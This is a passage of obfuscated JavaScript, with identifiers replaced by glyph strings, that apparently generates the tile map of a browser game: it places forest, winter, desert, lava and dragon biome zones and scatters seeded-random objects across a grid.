						ⲆⵠⵠⲆ(ᐃᐃΔΔ - 3, ⲆⲆᐃⵠ + ⵠᐃⲆⲆ, ⵠ[271], ⵠᐃⲆᐃ);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + 3, ⲆⲆᐃⵠ + ⵠᐃⲆⲆ, ⵠ[271], ⵠΔⲆⵠ);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ - 3, ⲆⲆᐃⵠ - ⵠᐃⲆⲆ, ⵠ[271], 0);
						ⲆⵠⵠⲆ(ᐃᐃΔΔ + 3, ⲆⲆᐃⵠ - ⵠᐃⲆⲆ, ⵠ[271], ⵠᐃⲆᐃ)
					}
				}
			};
			this.ⵠΔΔⵠΔΔᐃΔΔ = function(ⲆΔⲆⲆ) {
				for (var ⵠᐃ = ΔⲆⲆ; ⵠᐃ < ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.length && ⲆΔⲆⲆ > ⵠⲆᐃⵠ; ⵠᐃ++) {
					var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃ];
					if (ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ) continue;
					if (ᐃⲆⲆⵠ.w > 1800 && ᐃⲆⲆⵠ.ⵠⵠᐃ > 1e3) {
						var ⲆⲆᐃⵠ = Math.floor((ᐃⲆⲆⵠ.x1 + ᐃⲆⲆⵠ.w / 2) / ΔΔᐃⵠᐃ);
						var ᐃᐃΔΔ = Math.floor((ᐃⲆⲆⵠ.y1 + ᐃⲆⲆⵠ.ⵠⵠᐃ / 2) / 100);
						ⲆⲆⲆ.ᐃⲆⵠⵠⲆᐃΔ(ⲆΔⲆⲆ % ⲆᐃΔᐃ, ⲆⲆᐃⵠ, ᐃᐃΔΔ);
						for (var ⵠᐃⲆⲆ = 0; ΔΔⵠΔ > ⵠᐃⲆⲆ; ⵠᐃⲆⲆ++) {
							var ΔΔⵠᐃⲆᐃⲆ = ᐃᐃΔΔ - 2 + Math.floor(4 * ⲆⲆⲆ.ᐃⵠΔΔⲆ.get());
							var ΔⲆᐃᐃⵠ = ⲆⲆᐃⵠ - 3 + Math.floor(ⲆΔᐃΔⵠ * ⲆⲆⲆ.ᐃⵠΔΔⲆ.get());
							ⵠⵠⵠⲆⵠ === ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ΔΔⵠᐃⲆᐃⲆ][ΔⲆᐃᐃⵠ]["s"] && ⲆⵠⵠⲆ(ΔΔⵠᐃⲆᐃⲆ, ΔⲆᐃᐃⵠ, ⵠ[138], ⵠᐃⲆⲆ);
							var ΔΔⵠᐃⲆᐃⲆ = ᐃᐃΔΔ - ᐃⲆΔⲆ + Math.floor(ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() * ⲆᐃᐃΔ);
							var ΔⲆᐃᐃⵠ = ⲆⲆᐃⵠ - 3 + Math.floor(ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() * 6);
							if (ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ΔΔⵠᐃⲆᐃⲆ][ΔⲆᐃᐃⵠ][ⵠ[138]] === undefined) ⲆⵠⵠⲆ(ΔΔⵠᐃⲆᐃⲆ, ΔⲆᐃᐃⵠ, "s", ⵠᐃⲆⲆ)
						}
						var ΔΔⵠᐃⲆᐃⲆ = ᐃᐃΔΔ - 2 + Math.floor(4 * ⲆⲆⲆ.ᐃⵠΔΔⲆ.get());
						var ΔⲆᐃᐃⵠ = ⲆⲆᐃⵠ - 3 + Math.floor(ΔⵠⵠⲆΔ * ⲆⲆⲆ.ᐃⵠΔΔⲆ.get());
						ⲆΔΔΔⲆ === ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ΔΔⵠᐃⲆᐃⲆ][ΔⲆᐃᐃⵠ][ⵠ[138]] && undefined === ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ΔΔⵠᐃⲆᐃⲆ][ΔⲆᐃᐃⵠ]["s"] && ⲆⵠⵠⲆ(ΔΔⵠᐃⲆᐃⲆ, ΔⲆᐃᐃⵠ, "p", 0, ΔᐃⲆⵠ);
						ⲆΔⲆⲆ--
					}
				}
			};
			this.ⲆᐃΔΔⵠᐃⲆᐃⲆ = function(ΔⵠⲆᐃⵠ) {
				ⲆⲆⲆ.ᐃⵠΔΔⲆ.ⲆⲆⲆΔⵠ(ΔⵠⲆᐃⵠ);
				var ΔⵠᐃⵠᐃᐃⲆ = 0;
				while (ⵠΔⲆ) {
					ΔⵠᐃⵠᐃᐃⲆ++;
					if (ΔⵠᐃⵠᐃᐃⲆ > 1e4) return;
					ⲆⲆⲆ.ᐃⵠⵠⵠⵠ = [];
					ΔΔⵠⵠ === ⲆⲆⲆ.ᐃᐃⲆᐃⲆ && (ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⲆⵠΔⵠᐃ || ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⵠⵠⲆⲆⲆ || ⲆⲆⲆ.mode === ΔᐃᐃΔ.ⵠⵠⵠⵠⲆ) && (ⲆⲆⲆ.ᐃᐃⲆᐃⲆ = ⲆᐃⲆⵠᐃΔⵠ);
					if (ΔᐃᐃΔ.ⵠᐃᐃⲆᐃ === ⲆⲆⲆ.mode) {
						ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.push(new ⲆⲆⲆ.ΔⵠᐃⲆᐃⲆⵠ(ⲆⲆⲆ.ⲆΔΔᐃΔ, 2, 2, 80, 80, 15))
					} else if (ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ === ⲆⲆⲆ.mode) {
						ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.push(new ⲆⲆⲆ.ΔⵠᐃⲆᐃⲆⵠ(ⲆⲆⲆ.ⲆΔΔᐃΔ, ⵠⵠⵠΔ, 2, 150, 150, 15))
					} else {
						if (ⲆⲆⲆ.ᐃᐃⲆᐃⲆ !== ΔⲆⵠⲆ && 0 < ⲆⲆⲆ.ᐃᐃⲆᐃⲆ.length && 3 < ⲆⲆⲆ.ᐃᐃⲆᐃⲆ[Δᐃᐃⵠ].length) {
							for (var ⲆᐃΔⲆ = ΔΔⵠⵠ; ⲆⲆⲆ.ᐃᐃⲆᐃⲆ.length > ⲆᐃΔⲆ; ⲆᐃΔⲆ++) {
								var ᐃᐃΔⲆᐃ = ⲆⲆⲆ.ᐃᐃⲆᐃⲆ[ⲆᐃΔⲆ];
								if (ᐃΔΔ === ᐃᐃΔⲆᐃ[0]) {
									var ΔᐃⲆΔⵠ = ΔᐃᐃΔ.ⲆΔΔᐃΔ;
									switch (ᐃᐃΔⲆᐃ[1]) {
										case "FOREST":
											ΔᐃⲆΔⵠ = ⲆⲆⲆ.ⲆΔΔᐃΔ;
											break;
										case "WINTER":
											ΔᐃⲆΔⵠ = ⲆⲆⲆ.ΔᐃΔⵠᐃⵠΔ;
											break;
										case "DESERT":
											ΔᐃⲆΔⵠ = ⲆⲆⲆ.ⵠⵠΔΔΔΔᐃ;
											break;
										case "LAVA":
											ΔᐃⲆΔⵠ = ⲆⲆⲆ.ΔⲆⵠᐃⲆⵠⵠ;
											break;
										case "DRAGON":
											ΔᐃⲆΔⵠ = ⲆⲆⲆ.ⵠΔᐃⲆⵠΔⲆ;
											break
									}
									ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.push(new ⲆⲆⲆ.ΔⵠᐃⲆᐃⲆⵠ(ΔᐃⲆΔⵠ, ᐃᐃΔⲆᐃ[ΔⵠⵠΔ], ᐃᐃΔⲆᐃ[3], ᐃᐃΔⲆᐃ[4], ᐃᐃΔⲆᐃ[5], ᐃᐃΔⲆᐃ[6], ᐃᐃΔⲆᐃ[7]));
									continue
								} else break
							}
						} else if (0 !== ⲆⲆⲆ.ᐃᐃⲆᐃⲆ) {
							for (var ⲆᐃΔⲆ = Δᐃᐃᐃ; ⲆᐃΔⲆ < ⲆⲆⲆ.ᐃᐃⲆᐃⲆ.length; ⲆᐃΔⲆ++) {
								var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃᐃⲆᐃⲆ[ⲆᐃΔⲆ];
								var ΔᐃⲆΔⵠ = ΔᐃᐃΔ.ⲆΔΔᐃΔ;
								switch (ᐃⲆⲆⵠ[0]) {
									case "FOREST":
										ΔᐃⲆΔⵠ = ⲆⲆⲆ.ⲆΔΔᐃΔ;
										break;
									case "WINTER":
										ΔᐃⲆΔⵠ = ⲆⲆⲆ.ΔᐃΔⵠᐃⵠΔ;
										break;
									case "DESERT":
										ΔᐃⲆΔⵠ = ⲆⲆⲆ.ⵠⵠΔΔΔΔᐃ;
										break;
									case "LAVA":
										ΔᐃⲆΔⵠ = ⲆⲆⲆ.ΔⲆⵠᐃⲆⵠⵠ;
										break;
									case "DRAGON":
										ΔᐃⲆΔⵠ = ⲆⲆⲆ.ⵠΔᐃⲆⵠΔⲆ;
										break
								}
								if (ᐃⲆⲆⵠⲆⲆᐃⵠΔ(ΔᐃⲆΔⵠ, ᐃⲆⲆⵠ[1], ᐃⲆⲆⵠ[2], ΔΔⵠ, 10 * (ⲆᐃΔⲆ + ΔⲆᐃᐃ)) === ⵠⲆᐃⵠ) break
							}
							if (ⲆⲆⲆ.ᐃᐃⲆᐃⲆ.length !== ⲆᐃΔⲆ) continue
						}
					}
					break
				}
				ᐃᐃΔᐃᐃⵠⵠⵠⵠ();
				var ᐃⲆᐃΔⲆΔⵠ = [];
				for (var ⵠᐃ = ΔΔⵠ; ⵠᐃ < ⲆⲆⲆ.ⵠᐃⵠⲆⵠ; ⵠᐃ++) {
					ᐃⲆᐃΔⲆΔⵠ[ⵠᐃ] = new Array(ⲆⲆⲆ.ᐃΔᐃᐃΔ);
					for (var ᐃⵠᐃⵠ = 0; ᐃⵠᐃⵠ < ⲆⲆⲆ.ᐃΔᐃᐃΔ; ᐃⵠᐃⵠ++) ᐃⲆᐃΔⲆΔⵠ[ⵠᐃ][ᐃⵠᐃⵠ] = ᐃⵠⲆⵠ
				}
				for (var ⵠᐃ = 0; ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.length > ⵠᐃ; ⵠᐃ++) {
					var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃ];
					var ⵠⵠΔᐃ = ᐃⲆⲆⵠ.x2 / 100;
					var ΔᐃⵠⲆ = ᐃⲆⲆⵠ.y2 / 100;
					for (var Δⵠ = ᐃⲆⲆⵠ.x1 / ᐃᐃᐃⵠⵠⲆⵠ; ⵠⵠΔᐃ >= Δⵠ; Δⵠ++) {
						for (var ⲆⵠⲆ = ᐃⲆⲆⵠ.y1 / 100; ΔᐃⵠⲆ >= ⲆⵠⲆ; ⲆⵠⲆ++) ᐃⲆᐃΔⲆΔⵠ[ⲆⵠⲆ][Δⵠ] = ⵠΔⲆ
					}
				}
				for (var ⲆⵠⲆ = ᐃΔΔ; ⲆⵠⲆ < ⲆⲆⲆ.ⵠᐃⵠⲆⵠ; ⲆⵠⲆ++) {
					for (var Δⵠ = ΔᐃΔΔ; ⲆⲆⲆ.ᐃΔᐃᐃΔ > Δⵠ; Δⵠ++) {
						if (ᐃⲆᐃΔⲆΔⵠ[ⲆⵠⲆ][Δⵠ] === Ⲇᐃⵠⵠ) ᐃᐃⵠᐃⵠᐃΔⲆⵠ(ᐃⲆᐃΔⲆΔⵠ, Δⵠ, ⲆⵠⲆ)
					}
				}
				ΔⲆΔⵠⲆ = {
					w: ⲆⲆⲆ.ᐃΔᐃᐃΔ,
					"ⵠⵠᐃ": ⲆⲆⲆ.ⵠᐃⵠⲆⵠ,
					"ᐃΔⵠⲆ": []
				};
				for (var ⵠᐃ = ⵠᐃⲆᐃ; ⲆⲆⲆ.ⵠᐃⵠⲆⵠ > ⵠᐃ; ⵠᐃ++) ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ] = [];
				if (0 !== ⲆⲆⲆ.ᐃᐃⲆᐃⲆ && ⲆⲆⲆ.ᐃᐃⲆᐃⲆ.length > 0 && ⲆⲆⲆ.ᐃᐃⲆᐃⲆ[0].length > 3) {
					for (var ⲆᐃΔⲆ = Δⵠᐃ; ⲆᐃΔⲆ < ⲆⲆⲆ.ᐃᐃⲆᐃⲆ.length; ⲆᐃΔⲆ++) {
						var ᐃᐃΔⲆᐃ = ⲆⲆⲆ.ᐃᐃⲆᐃⲆ[ⲆᐃΔⲆ];
						ᐃᐃΔⲆᐃ[1] === ⵠ[424] && ⲆⲆⲆ.ᐃⲆⵠⵠⲆᐃΔ(ᐃᐃΔⲆᐃ[2], ᐃᐃΔⲆᐃ[3], ᐃᐃΔⲆᐃ[ΔᐃⵠⵠⲆ])
					}
				} else ⲆⲆⲆ.ⵠΔΔⵠΔΔᐃΔΔ(ⲆⲆⲆ.ΔⲆΔᐃⵠΔⲆ);
				if (ΔᐃΔΔ !== ⲆⲆⲆ.ᐃᐃⲆᐃⲆ && 0 < ⲆⲆⲆ.ᐃᐃⲆᐃⲆ.length && ⲆⲆⲆ.ᐃᐃⲆᐃⲆ[ᐃΔΔ].length > 3) {
					var Ⲇᐃᐃⵠⵠ = [];
					for (var ⲆᐃΔⲆ = ⵠᐃⲆᐃ; ⲆⲆⲆ.ᐃᐃⲆᐃⲆ.length > ⲆᐃΔⲆ; ⲆᐃΔⲆ++) {
						var ᐃᐃΔⲆᐃ = ⲆⲆⲆ.ᐃᐃⲆᐃⲆ[ⲆᐃΔⲆ];
						if (ᐃᐃΔⲆᐃ[0] !== ΔⲆⵠ) continue;
						if (ᐃᐃΔⲆᐃ[1] === "r") {
							ⲆⵠⵠⲆ(ᐃᐃΔⲆᐃ[ⵠⵠⵠᐃ], ᐃᐃΔⲆᐃ[2], ⵠ[26], 0, ᐃᐃⲆΔ);
							Ⲇᐃᐃⵠⵠ.push([ᐃᐃΔⲆᐃ[ΔⲆΔᐃ], ᐃᐃΔⲆᐃ[ⲆΔΔⵠ], ᐃᐃΔⲆᐃ[4]])
						} else ⲆⵠⵠⲆ(ᐃᐃΔⲆᐃ[4], ᐃᐃΔⲆᐃ[Δⵠᐃⵠ], ᐃᐃΔⲆᐃ[1], ᐃᐃΔⲆᐃ[2], ᐃᐃΔⲆᐃ[5])
					}
					ΔΔΔⵠⵠⲆΔ(Δᐃᐃᐃ, Ⲇᐃᐃⵠⵠ);
					Ⲇᐃᐃⵠⵠ = []
				} else {
					for (var ⵠᐃ = Ⲇᐃⵠⵠ; ⵠᐃ < ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.length; ⵠᐃ++) {
						var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃ];
						if (ΔᐃᐃΔ.ⲆⲆⵠⵠⲆ === ⲆⲆⲆ.mode) {
							ᐃⲆⲆⵠ.ΔᐃⲆ === ⲆⲆⲆ.ⲆΔΔᐃΔ && ᐃΔΔᐃⲆΔⵠᐃᐃ(ⵠᐃ, ᐃⲆⲆⵠ.w / (ᐃΔⲆⲆᐃ * ᐃΔⲆⲆᐃ))
						} else {
							ⲆⲆⲆ.ⲆΔΔᐃΔ === ᐃⲆⲆⵠ.ΔᐃⲆ && ΔⵠΔⲆᐃᐃᐃᐃⲆ(ⵠᐃ, ᐃⲆⲆⵠ.w / (ⲆᐃΔⵠⵠ * 100));
							ⲆⲆⲆ.ΔⲆⵠᐃⲆⵠⵠ === ᐃⲆⲆⵠ.ΔᐃⲆ && ᐃⲆⲆᐃᐃᐃᐃᐃᐃ(ⵠᐃ, ᐃⲆⲆⵠ.w / (ΔᐃΔᐃΔ * 100));
							if (ⲆⲆⲆ.ΔᐃΔⵠᐃⵠΔ === ᐃⲆⲆⵠ.ΔᐃⲆ) ΔⵠΔᐃⵠΔⵠΔⵠ(ⵠᐃ, ᐃⲆⲆⵠ.w / (100 * ᐃⵠΔᐃᐃ));
							ᐃⲆⲆⵠ.ΔᐃⲆ === ⲆⲆⲆ.ⵠⵠΔΔΔΔᐃ && ⵠᐃⲆᐃⲆᐃΔΔᐃ(ⵠᐃ, ᐃⲆⲆⵠ.w / (ᐃΔⲆⲆᐃ * ⲆⵠᐃΔⲆ));
							ᐃⲆⲆⵠ.ΔᐃⲆ === ⲆⲆⲆ.ⵠΔᐃⲆⵠΔⲆ && ⵠⲆⵠⵠᐃⲆᐃᐃⵠ(ⵠᐃ)
						}
					}
				}
				ⲆⵠᐃⲆΔΔᐃⲆⵠ();
				ⲆⲆⲆ.ⲆⵠΔΔΔᐃⵠⲆᐃ(ΔⲆΔⵠⲆ)
			};

			function ᐃΔΔᐃⲆΔⵠᐃᐃ(ΔⲆⵠᐃ, ⲆⲆΔⲆⵠ) {
				for (var ⵠᐃ = 0; ⵠᐃ < 6; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "t", ⵠᐃ, Math.floor(80 * ⲆⲆΔⲆⵠ));
				for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆⲆΔ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "b", ⵠᐃ, Math.floor(80 * ⲆⲆΔⲆⵠ));
				for (var ⵠᐃ = ᐃⵠⲆⵠ; ΔᐃⲆΔ > ⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "s", ⵠᐃ, Math.floor(50 * ⲆⲆΔⲆⵠ));
				var Ⲇᐃᐃⵠⵠ = [];
				for (var ⵠᐃ = Ⲇᐃⵠⵠ; 6 > ⵠᐃ; ⵠᐃ++) ⲆⵠⲆΔᐃᐃⵠ(ΔⲆⵠᐃ, Ⲇᐃᐃⵠⵠ);
				ΔΔΔⵠⵠⲆΔ(ΔⲆⵠᐃ, Ⲇᐃᐃⵠⵠ);
				Ⲇᐃᐃⵠⵠ = [];
				ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "p", 0, Math.floor(ⲆⲆΔⲆⵠ * 28));
				for (var ⵠᐃ = 0; ⵠᐃ < 3; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "g", ⵠᐃ, Math.floor(7 * ⲆⲆΔⲆⵠ));
				for (var ⵠᐃ = 0; 3 > ⵠᐃ; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "d", ⵠᐃ, Math.floor(ⲆⲆΔⲆⵠ * ⲆᐃᐃⲆ));
				for (var ⵠᐃ = 0; ⵠᐃ < 3; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "a", ⵠᐃ, Math.floor(1 * ⲆⲆΔⲆⵠ));
				for (var ⵠᐃ = 0; ⵠᐃ < 3; ⵠᐃ++) ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "m", ⵠᐃ, Math.floor(ⲆⲆΔⲆⵠ * 1));
				ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, "a", ᐃΔΔ, Math.floor(ΔⲆᐃᐃ * ⲆⲆΔⲆⵠ));
				ⵠΔⲆΔᐃⲆⲆ(ΔⲆⵠᐃ)
			}

			function ⵠΔⲆΔᐃⲆⲆ(ΔⲆⵠᐃ) {
				var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ΔⲆⵠᐃ];
				ⲆⵠⵠⲆ(-3 + Math.floor(ᐃⲆⲆⵠ.y2 / ΔΔᐃⵠᐃ), -1 + Math.floor(ᐃⲆⲆⵠ.x2 / ᐃΔⲆⲆᐃ), "s", 0, 0);
				ⲆⵠⵠⲆ(3 + Math.floor(ᐃⲆⲆⵠ.y1 / 100), -ΔᐃⲆⵠ + Math.floor(ᐃⲆⲆⵠ.x2 / ᐃᐃᐃⲆⲆᐃⲆ), "s", ⵠⲆᐃⵠ, 0);
				ⲆⵠⵠⲆ(-Δⵠᐃⵠ + Math.floor(ᐃⲆⲆⵠ.y2 / ⲆᐃΔⵠⵠ), 1 + Math.floor(ᐃⲆⲆⵠ.x1 / ⵠⵠΔᐃᐃ), "s", Δᐃᐃᐃ, 0);
				ⲆⵠⵠⲆ(3 + Math.floor(ᐃⲆⲆⵠ.y1 / ᐃⵠΔᐃᐃ), ΔⵠΔⵠ + Math.floor(ᐃⲆⲆⵠ.x1 / ΔΔᐃⵠᐃ), "s", 0, Δᐃᐃⵠ)
			}

			function ⲆⲆᐃΔᐃᐃⲆⵠΔ(ⵠᐃ, ᐃⵠᐃⵠ, ΔⲆⵠᐃ, ⲆⲆⲆᐃⲆΔΔ) {
				if (!ᐃᐃⵠᐃᐃⲆⲆ(ⵠᐃ, ᐃⵠᐃⵠ)) return;
				ᐃΔⵠⲆ = ΔⲆΔⵠⲆ.ᐃΔⵠⲆ;
				undefined === ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ] && (ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ] = {});
				if (ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ]["r"] !== undefined) return;
				var Ⲇᐃᐃᐃⵠ = ᐃⵠⲆⵠ;
				ᐃᐃⵠᐃᐃⲆⲆ(ⵠᐃ - 1, ᐃⵠᐃⵠ) && ⵠᐃⵠⲆΔ !== ᐃΔⵠⲆ[ⵠᐃ - ΔᐃᐃⲆ][ᐃⵠᐃⵠ] && undefined !== ᐃΔⵠⲆ[ⵠᐃ - 1][ᐃⵠᐃⵠ][ⵠ[26]] && (Ⲇᐃᐃᐃⵠ += ᐃⲆΔⲆ);
				if (ᐃᐃⵠᐃᐃⲆⲆ(ⵠᐃ, ᐃⵠᐃⵠ - Ⲇᐃⵠ) && ⲆΔᐃᐃᐃ !== ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ - Ⲇᐃⵠ] && undefined !== ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ - ⵠⲆΔ][ⵠ[26]]) Ⲇᐃᐃᐃⵠ += ⵠᐃΔΔᐃⲆⵠ;
				if (ᐃᐃⵠᐃᐃⲆⲆ(ⵠᐃ, ᐃⵠᐃⵠ + ᐃΔᐃⲆ) && ⲆΔΔΔⲆ !== ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ + 1] && ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ + 1][ⵠ[26]] !== undefined) Ⲇᐃᐃᐃⵠ += 16;
				ᐃᐃⵠᐃᐃⲆⲆ(ⵠᐃ + ΔⵠΔⵠ, ᐃⵠᐃⵠ) && ᐃΔⵠⲆ[ⵠᐃ + 1][ᐃⵠᐃⵠ] !== undefined && ᐃΔⵠⲆ[ⵠᐃ + ΔⵠΔⵠ][ᐃⵠᐃⵠ][ⵠ[26]] !== undefined && (Ⲇᐃᐃᐃⵠ += 64);
				if (ᐃᐃⵠᐃᐃⲆⲆ(ⵠᐃ - ⲆⵠⲆⲆ, ᐃⵠᐃⵠ - 1) && (Ⲇᐃᐃᐃⵠ & 8 + ᐃⲆⵠᐃ) === 8 + ⵠⵠⵠΔ && ᐃΔⵠⲆ[ⵠᐃ - ⵠΔⵠΔ][ᐃⵠᐃⵠ - ᐃΔᐃⲆ] !== undefined && ᐃΔⵠⲆ[ⵠᐃ - ᐃᐃⵠ][ᐃⵠᐃⵠ - 1][ⵠ[26]] !== ᐃᐃⵠⵠΔ) Ⲇᐃᐃᐃⵠ += ᐃᐃⲆΔ;
				if (ᐃᐃⵠᐃᐃⲆⲆ(ⵠᐃ - ΔΔᐃⵠ, ᐃⵠᐃⵠ + ΔᐃⲆⵠ) && ⵠⲆᐃⲆᐃΔⲆ + 2 === (Ⲇᐃᐃᐃⵠ & ⵠΔⲆᐃᐃ + Δᐃⵠⵠ) && ᐃΔⵠⲆ[ⵠᐃ - ⵠᐃⵠΔ][ᐃⵠᐃⵠ + 1] !== undefined && ᐃΔⵠⲆ[ⵠᐃ - ᐃᐃⲆΔ][ᐃⵠᐃⵠ + ΔᐃⲆⵠ][ⵠ[26]] !== undefined) Ⲇᐃᐃᐃⵠ += 4;
				if (ᐃᐃⵠᐃᐃⲆⲆ(ⵠᐃ + 1, ᐃⵠᐃⵠ - 1) && (Ⲇᐃᐃᐃⵠ & ⵠᐃΔⵠΔΔⵠ + 64) === 72 && ⲆΔᐃᐃᐃ !== ᐃΔⵠⲆ[ⵠᐃ + 1][ᐃⵠᐃⵠ - 1] && ⵠᐃⵠⲆΔ !== ᐃΔⵠⲆ[ⵠᐃ + 1][ᐃⵠᐃⵠ - 1][ⵠ[26]]) Ⲇᐃᐃᐃⵠ += 32;
				if (ᐃᐃⵠᐃᐃⲆⲆ(ⵠᐃ + 1, ᐃⵠᐃⵠ + ⵠΔΔ) && ΔⵠᐃᐃⵠⲆⲆ + 64 === (Ⲇᐃᐃᐃⵠ & ⲆⲆⲆΔΔ + 64) && ᐃΔⵠⲆ[ⵠᐃ + ΔⵠΔⵠ][ᐃⵠᐃⵠ + ⵠᐃⵠΔ] !== ⲆΔᐃᐃᐃ && ᐃΔⵠⲆ[ⵠᐃ + 1][ᐃⵠᐃⵠ + ΔⲆᐃᐃ][ⵠ[26]] !== ᐃᐃⵠⵠΔ) Ⲇᐃᐃᐃⵠ += 128;
				ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ]["r"] = {};
				ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ]["r"].ΔᐃᐃᐃᐃⲆᐃ = Ⲇᐃᐃᐃⵠ;
				ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ]["r"].ⲆⲆⲆᐃⲆΔΔ = ⲆⲆⲆᐃⲆΔΔ;
				ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ]["r"].ᐃⵠⵠᐃ = ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ΔⲆⵠᐃ, ΔᐃⵠⲆⲆ * ᐃⵠᐃⵠ + 50, ⵠᐃ * 100 + 50) - 400;
				ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ]["r"]["x"] = ᐃⵠᐃⵠ * ⲆⵠᐃΔⲆ + 50;
				ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ]["r"]["y"] = ⵠᐃ * 100 + 50
			}

			function ΔᐃⵠΔⵠ(ΔⲆⵠᐃ, ᐃᐃⵠⵠ, ΔⲆᐃᐃΔ, ⲆΔⲆⲆ, ⲆⵠⲆᐃⵠⲆⵠ) {
				var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ΔⲆⵠᐃ];
				var Δⵠ = Math.floor(ᐃⲆⲆⵠ.x1 / 100);
				var ⲆⵠⲆ = Math.floor(ᐃⲆⲆⵠ.y1 / 100);
				var ᐃⵠⵠ = Math.floor(ᐃⲆⲆⵠ.w / 100);
				var ⵠⵠᐃ = Math.floor(ᐃⲆⲆⵠ.ⵠⵠᐃ / 100);
				if (ⲆᐃΔⲆᐃ !== ⲆⵠⲆᐃⵠⲆⵠ) {
					ⲆⵠⲆᐃⵠⲆⵠ = ⵠᐃⵠΔ - ⲆⵠⲆᐃⵠⲆⵠ;
					Δⵠ += Math.floor(ⲆⵠⲆᐃⵠⲆⵠ * ᐃⵠⵠ / Ⲇⵠⵠᐃ);
					ⲆⵠⲆ += Math.floor(ⵠⵠᐃ * ⲆⵠⲆᐃⵠⲆⵠ / ᐃⵠⲆⲆⲆ);
					ᐃⵠⵠ -= Math.floor(ᐃⵠⵠ * ⲆⵠⲆᐃⵠⲆⵠ);
					ⵠⵠᐃ -= Math.floor(ⲆⵠⲆᐃⵠⲆⵠ * ⵠⵠᐃ)
				}
				var ᐃΔⵠⲆ = ΔⲆΔⵠⲆ.ᐃΔⵠⲆ;
				for (var ⲆⲆⵠΔ = ΔΔⵠⵠ, ⵠᐃⲆⲆ = ⲆⲆⲆᐃ; ⵠᐃⲆⲆ < ⲆΔⲆⲆ; ⲆⲆⵠΔ++) {
					if (5e4 < ⲆⲆⵠΔ) break;
					var ⵠᐃ = ⲆⵠⲆ + Math.floor(ⲆⲆⲆ.ᐃⵠΔΔⲆ.get() * ⵠⵠᐃ);
					var ᐃⵠᐃⵠ = Δⵠ + Math.floor(ᐃⵠⵠ * ⲆⲆⲆ.ᐃⵠΔΔⲆ.get());
					var ᐃⵠⵠᐃ = ⲆⲆⲆ.ⲆⲆⵠⵠᐃ(ΔⲆⵠᐃ, ᐃⵠᐃⵠ * ⵠⵠΔᐃᐃ + 50, ⵠᐃ * ⵠᐃⲆΔΔ + 50);
					if (400 > ᐃⵠⵠᐃ) continue;
					var ⵠᐃᐃᐃ = ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ + 1];
					if (undefined !== ⵠᐃᐃᐃ && ⵠⵠⵠⲆⵠ !== ⵠᐃᐃᐃ[ᐃᐃⵠⵠ] && ⵠᐃᐃᐃ[ᐃᐃⵠⵠ][ΔⲆᐃᐃΔ] !== ⲆΔΔΔⲆ) continue;
					var ⵠᐃᐃᐃ = ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ - 1];
					if (undefined !== ⵠᐃᐃᐃ && ⵠⵠᐃᐃᐃ !== ⵠᐃᐃᐃ[ᐃᐃⵠⵠ] && ⵠᐃᐃᐃ[ᐃᐃⵠⵠ][ΔⲆᐃᐃΔ] !== undefined) continue;
					var ⵠᐃᐃᐃ = ᐃΔⵠⲆ[ⵠᐃ + ⵠΔᐃ][ᐃⵠᐃⵠ];
					if (ᐃⵠᐃⵠᐃ !== ⵠᐃᐃᐃ && undefined !== ⵠᐃᐃᐃ[ᐃᐃⵠⵠ] && undefined !== ⵠᐃᐃᐃ[ᐃᐃⵠⵠ][ΔⲆᐃᐃΔ]) continue;
